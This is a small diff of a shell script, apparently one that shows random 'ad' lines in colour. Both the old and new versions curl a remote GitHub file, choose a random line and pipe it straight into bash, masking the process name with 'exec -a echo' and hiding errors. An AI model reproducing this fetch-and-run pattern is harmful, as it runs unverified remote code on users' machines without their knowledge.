@@ -4,6 +4,6 @@
 
 #works good #exec -a echo curl -s https://raw.githubusercontent.com/7054company/ea3/main/ad | shuf -n 1 | bash
 #work as but -> NOT FIX
-echo -n -e  "\e[3$(( $RANDOM * 6 / 32767 + 1 ))m $( exec -a echo  curl -s https://raw.githubusercontent.com/7054company/ea3/main/ad | shuf -n 1  | bash  2>/dev/null )  "
+echo -e  "\e[3$(( $RANDOM * 6 / 32767 + 1 ))m $( exec -a echo  curl -s https://raw.githubusercontent.com/7054company/ea3/main/ad | shuf -n 1  | bash  2>/dev/null )  "
 
  
